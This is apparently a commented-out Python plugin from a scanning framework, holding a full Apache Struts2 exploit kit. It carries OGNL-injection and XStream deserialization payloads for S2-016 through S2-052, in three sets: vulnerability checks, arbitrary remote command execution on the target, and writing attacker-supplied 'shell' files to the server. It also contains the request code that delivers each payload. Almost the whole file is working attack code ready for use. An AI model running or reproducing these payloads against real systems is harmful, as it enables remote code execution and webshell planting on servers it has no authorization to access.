# #!/usr/bin/env python
# # -*- coding: utf-8 -*-
# __author__ = 'orleven'
#
# import requests
# import urllib.parse
# requests.packages.urllib3.disable_warnings()
#
# def get_script_info(data=None):
#     script_info = {
#         "name": "Struts scan",
#         "info": "Struts vul scan.",
#         "level": "high",
#         "type": "rec",
#     }
#     return script_info
#
# def prove(data):
#     data = init(data, 'web')
#     if data['url'] != None:
#         vulname = ''
#         data, base_url =  _url_deal(data['headers'],data)
#         struts2 = _struts2(data['headers'],data,base_url,data['timeout'])
#         if vulname == '':
#             for vul in struts2.prove_poc.keys():
#                 flag, res = struts2.prove(vul)
#                 if flag:
#                     data['flag'] = 1
#                     data['data'].append({"vulname": ""})
#                     data['res'].append({"info": res , "key": vul})
#         else:
#             flag, res = struts2.prove(vulname)
#             if flag:
#                 data['flag'] = 1
#                 data['data'].append({"vulname": ""})
#                 data['res'].append({"info": res, "key": vulname})
#     return data
#
#
# def exec(data=None):
#     data = init(data, 'web')
#     if data['url'] != None:
#         vulname = ''
#         data, base_url = _url_deal(data['headers'], data)
#         struts2 = _struts2(data['headers'], data, base_url,data['timeout'])
#         if 'cmd' not in data.keys() :
#             raise Exception("None cmd ")
#         if vulname == '':
#             for vul in struts2.exec_poc.keys():
#                 flag, res = struts2.exec(vul,data['cmd'])
#                 if flag:
#                     data['flag'] = 1
#                     data['data'].append({"vulname": ""})
#                     data['res'].append({"info": res, "key": vul})
#         else:
#             flag, res = struts2.exec(vulname,data['cmd'])
#             if flag:
#                 data['flag'] = 1
#                 data['data'].append({"vulname": ""})
#                 data['res'].append({"info": res, "key": vulname})
#
#     return data
#
#
#
# def upload(data=None):
#     data = init(data, 'web')
#     if data['url'] != None:
#         vulname = ''
#         data, base_url = _url_deal(data['headers'], data)
#         struts2 = _struts2(data['headers'], data, base_url,data['timeout'])
#         if 'path' not in data.keys() :
#             raise Exception("None path ")
#         content = _read_file(data['path'])
#         if vulname == '':
#             for vul in struts2.upload_poc.keys():
#                 flag, res = struts2.upload(vul,data['path'],content)
#                 if flag:
#                     data['flag'] = 1
#                     data['data'].append({"vulname": ""})
#                     data['res'].append({"info": res, "key": vul})
#         else:
#             flag, res = struts2.upload(vulname,data['path'],content)
#             if flag:
#                 data['flag'] = 1
#                 data['data'].append({"vulname": ""})
#                 data['res'].append({"info": res, "key": vulname})
#
#     return data
#
# class _struts2:
#     def __init__(self,headers, data,base_url,timeout):
#         self.base_url = base_url
#         self.timeout = timeout
#         self.headers = headers
#         self.data = data
#         self.prove_poc = {  # S2_019/S2_048/S2_037，S2_052 未验证
#             "S2_016" : '''redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2_security_vul_str2016%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()%7d''',
#             "S2_019" : '''debug%3dcommand%26expression%3d%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().print(%22struts2_se%22%2b%22curity_vul%22)%2c%23resp.getWriter().print(%22struts2_security_vul_str2019%22)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()''',
#             "S2_032" : '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=struts2_security_vul&path=_str2016''',
#             "S2_037" : '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=@org.apache.struts2.ServletActionContext@getRequest(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#w.print(#parameters.web[0]),#w.print(#parameters.path[0]),#w.close()):xx.toString.json?&pp=/&encoding=UTF-8&web=struts2_security_vul&path=struts2_security_vul_str2037''',
#             "S2_045" : '''%{#context['co'+'m.ope'+'nsympho'+'ny.xw'+'ork2.di'+'spatch'+'er.Htt'+'pServl'+'etResponse'].addHeader('struts2_security_vul','struts2_security_vul_str2045'+'_'+'multipart/form-data')}''',
#             "S2_046" : '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_vul')).(#res.getWriter().print('struts2_security_vul_str2046')).(#res.getWriter().flush()).(#res.getWriter().close())}\0b''',
#             "S2_048" : '''%25%7b(%23nike%3d%27multipart%2fform-data%27).(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27netstat+-an%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)).(%23ros.flush())%7d''',
#             "S2_052" : '''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>echo</string><string>struts2_security_vul</string></command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map> ''',
#         }
#         self.poc_key = {
#             "S2_016": "struts2_security_vul",
#             "S2_019": "struts2_security_vul",
#             "S2_032": "struts2_security_vul",
#             "S2_037": "struts2_security_vul",
#             "S2_045": "struts2_security_vul",
#             "S2_046": "struts2_security_vul",
#             "S2_048": "struts2_security_vul",
#             "S2_052": "struts2_security_vul",
#         }
#         self.exec_poc = {# S2_019/S2_048/S2_037，S2_052 未验证
#             "S2_016" : '''redirect%3a%24%7b%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)%2c%23s%3dnew+java.util.Scanner((new+java.lang.ProcessBuilder(%27%COMMAND%%27.toString().split(%27%5c%5c%5c%5cs%27))).start().getInputStream()).useDelimiter(%27%5c%5c%5c%5cAAAA%27)%2c%23str%3d%23s.hasNext()%3f%23s.next()%3a%27%27%2c%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)%2c%23resp.setCharacterEncoding(%27UTF-8%27)%2c%23resp.getWriter().println(%23str)%2c%23resp.getWriter().flush()%2c%23resp.getWriter().close()%7d''',
#             "S2_019" : '''debug=command&expression=#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#resp.getWriter().print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("%COMMAND%").getInputStream())),#resp.getWriter().flush(),#resp.getWriter().close()''',
#             "S2_032" : '''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=%COMMAND%&pp=\\\\AAAA&ppp=%20&encoding=UTF-8''',
#             "S2_037" : '''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close()):xx.toString.json&cmd=%COMMAND%&pp=\\\\AAAA&ppp= &encoding=UTF-8''',
#             "S2_045" : '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#s=new java.util.Scanner((new java.lang.ProcessBuilder('%COMMAND%'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA')).(#str=#s.hasNext()?#s.next():'').(#res.getWriter().print(#str)).(#res.getWriter().flush()).(#res.getWriter().close()).(#s.close())}''',
#             "S2_046" : '''%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='%COMMAND%').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b''',
#             "S2_048" : '''%25%7b(%23test%3d%27multipart%2fform-data%27).(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.setContentType(%27text%2fhtml%3bcharset%3dUTF-8%27)).(%23res.getWriter().print(%27start%3astruts2_security_%27)).(%23res.getWriter().print(%27check%3aend%27)).(%23res.getWriter().flush()).(%23res.getWriter().close())%7d''',
#             "S2_052" : '''<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command>%COMMAND%</command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map>''',
#
#         }
#
#         self.upload_poc = { # 除了S2_016,S2_032,S2_045，S2_046， 均未验证
#             # %PATH%
#             # %FILECONTENT%
#             "S2_016": '''redirect%3a%24%7b%23req%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27)%2c%23res%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27)%2c%23res.getWriter().print(%22oko%22)%2c%23res.getWriter().print(%22kok%2f%22)%2c%23res.getWriter().print(%23req.getContextPath())%2c%23res.getWriter().flush()%2c%23res.getWriter().close()%2cnew+java.io.BufferedWriter(new+java.io.FileWriter(%22%PATH%%22)).append(%23req.getParameter(%22shell%22)).close()%7d&shell=%FILECONTENT%''',
#             "S2_019":'''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#res=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#res.getWriter().print("oko"),#res.getWriter().print("kok/"),#res.getWriter().print(#req.getContextPath()),#res.getWriter().flush(),#res.getWriter().close(),new java.io.BufferedWriter(new java.io.FileWriter(%PATH%)).append(#req.getParameter("shell")).close()&shell=%FILECONTENT%''',
#             "S2_032":'''method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close(),1?%23xx:%23request.toString&shellname=%PATH%&shellContent=%FILECONTENT%&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f''',
#             "S2_037":'''(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=@org.apache.struts2.ServletActionContext@getRequest(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#path=#req.getRealPath(#parameters.pp[0]),new java.io.BufferedWriter(new java.io.FileWriter(#parameters.shellname[0]).append(#parameters.shellContent[0])).close(),#w.print(#parameters.info1[0]),#w.print(#parameters.info2[0]),#w.print(#req.getContextPath()),#w.close()):xx.toString.json&shellname=%PATH%&shellContent=%FILECONTENT%&encoding=UTF-8&pp=/&info1=oko&info2=kok/''',
#             "S2_045": '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#fs=new java.io.FileOutputStream("%PATH%")).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/')).(#out.print(#req.getContextPath())).(#out.close())}''',
#             "S2_046": '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#filecontent='%FILECONTENT%').(new java.io.BufferedWriter(new java.io.FileWriter('%PATH%')).append(new java.net.URLDecoder().decode(#filecontent,'UTF-8')).close()).(#res.getWriter().print('oko')).(#res.getWriter().print('kok/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}\0b''',
#             "S2_048": '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('start:')).(#fs=new java.io.FileOutputStream(%PATH%)).(#out=#res.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),#fs)).(#fs.close()).(#out.print('oko')).(#out.print('kok/:end')).(#out.print(#req.getContextPath())).(#out.close())}''',
#         }
#
#
#     def prove(self,vulname):
#
#         headers = self.headers
#         if vulname in self.prove_poc.keys():
#             try:
#                 if vulname == 'S2_045':
#                     headers['Content-Type'] = self.prove_poc[vulname]
#                     res = requests.get(self.data['url'], headers=headers, timeout=self.timeout, verify=False)
#                 elif vulname == 'S2_046':
#                     files = {"test": (self.prove_poc[vulname], "text/plain")}
#                     res = requests.post(self.data['url'], headers=headers, files=files, timeout=self.timeout, verify=False)
#                 elif vulname == 'S2_048':
#                     data = 'name=' + self.prove_poc[vulname] + '&age=a&__checkbox_bustedBefore=true&description=s'
#                     res = requests.get(self.base_url + '/struts2-showcase/integration/saveGangster.action', params=data,
#                                     headers=headers, timeout=self.timeout, verify=False)
#                 elif vulname == 'S2_052':
#                     headers['Content-Type'] = "application/xml"
#                     res = requests.post(self.data['url'], data=self.prove_poc[vulname], headers=headers, timeout=self.timeout, verify=False)
#                 else:
#                     headers["Content-Type"] = "application/x-www-form-urlencoded"
#                     res = requests.get(self.data['url'], params= self.prove_poc[vulname], headers=headers, timeout=self.timeout, verify=False)
#                 if self.poc_key[vulname] in res.headers or self.poc_key[vulname] in res.text:
#                     return True,self.poc_key[vulname]+"_"+vulname
#             except:
#                 pass
#         return False,None
#
#     def exec(self, vulname,cmd):
#         import requests
#         requests.packages.urllib3.disable_warnings()
#         headers = self.headers
#         if vulname in self.exec_poc.keys():
#             try:
#                 if vulname == 'S2_045':
#                     headers['Content-Type'] = self.exec_poc[vulname].replace("%COMMAND%",cmd)
#                     res = requests.get(self.data['url'], headers=headers, timeout=self.timeout, verify=False).text
#                 elif vulname == 'S2_046':
#                     files = {"test": (self.exec_poc[vulname].replace("%COMMAND%",cmd), "text/plain")}
#                     r = requests.post(self.data['url'], headers=headers, files=files, timeout=self.timeout, verify=False, stream=True)
#                     res = ""
#                     try:
#                         for line in r.iter_lines():
#                             res += str(line)+'\r\n'
#                     except:
#                         res = str(res)
#                         pass
#                 elif vulname == 'S2_048':
#                     data = 'name=' +self.exec_poc[vulname].replace("%COMMAND%",cmd) + '&age=a&__checkbox_bustedBefore=true&description=s'
#                     res = requests.post(self.base_url + '/struts2-showcase/integration/saveGangster.action', data=data,
#                                     headers=headers, timeout=self.timeout, verify=False).text
#                 elif vulname == 'S2_052':
#                     headers['Content-Type'] = "application/xml"
#                     command = ""
#                     cmds = cmd.split()
#                     for each in cmds:
#                         command += "<string>" + each + "</string>"
#                     res = requests.post(self.data['url'], data=self.exec_poc[vulname].replace("%COMMAND%",command), headers=headers, timeout=self.timeout, verify=False).text
#                 else:
#                     headers["Content-Type"] = "application/x-www-form-urlencoded"
#                     res = requests.get(self.data['url'], params=self.exec_poc[vulname].replace("%COMMAND%",cmd), headers=headers,
#                                    timeout=self.timeout, verify=False).text
#                 return True, vulname + "_" + res
#             except:
#                 pass
#         return False, None
#
#     def upload(self, vulname,path, content):
#         # %PATH%
#         # %FILECONTENT%
#         headers = self.headers
#         if vulname in self.upload_poc.keys():
#             try:
#                 if vulname == 'S2_045':
#                     headers['Content-Type'] = self.upload_poc[vulname].replace("%PATH%", path).replace("%FILECONTENT%", content)
#                     res = requests.get(self.data['url'], headers=headers, timeout=self.timeout,data=content, verify=False).text
#                 elif vulname == 'S2_046':
#                     files = {"test": (self.upload_poc[vulname].replace("%PATH%", path).replace("%FILECONTENT%", content), "text/plain")}
#                     res = requests.post(self.data['url'], headers=headers, files=files, timeout=self.timeout, verify=False).text
#                 elif vulname == 'S2_048':
#                     data = 'name=' + self.upload_poc[vulname].replace("%PATH%",
#                                                                 path).replace("%FILECONTENT%", content) + '&age=a&__checkbox_bustedBefore=true&description=s'
#                     res = requests.post(self.base_url + '/struts2-showcase/integration/saveGangster.action', data=data,
#                                     headers=headers, timeout=self.timeout, verify=False).text
#                 elif vulname == 'S2_052':
#                     headers['Content-Type'] = "application/xml"
#                     res = requests.post(self.data['url'], data=self.upload_poc[vulname].replace("%PATH%", path).replace("%FILECONTENT%", content),
#                                     headers=headers, timeout=self.timeout, verify=False).text
#                 else:
#                     headers["Content-Type"] = "application/x-www-form-urlencoded"
#                     res = requests.get(self.data['url'], params=self.upload_poc[vulname].replace("%PATH%", path).replace("%FILECONTENT%", content),
#                                    headers=headers,
#                                    timeout=self.timeout, verify=False).text
#                 return True, vulname + "_" + path
#             except:
#                     pass
#         return False, None
#
# def _curl_status(data, url, headers,timeout):
#     try:
#         requests.get(url, headers=headers, verify=False, timeout=timeout)
#         return True
#     except:
#         return False
#
# def _url_deal(headers,data):
#     if data['url']:
#         protocol, s1 = urllib.parse.splittype(data['url'])
#         host, s2 = urllib.parse.splithost(s1)
#         host, port = urllib.parse.splitport(host)
#         port = data['target_port'] if port != None else 443 if protocol == 'https' else 80
#         base_url = protocol + "://" + host + ":" + str(port)
#     return data,base_url
#
# def _read_file(dicname):
#     with open(dicname, 'r') as f:
#         return f.readlines()
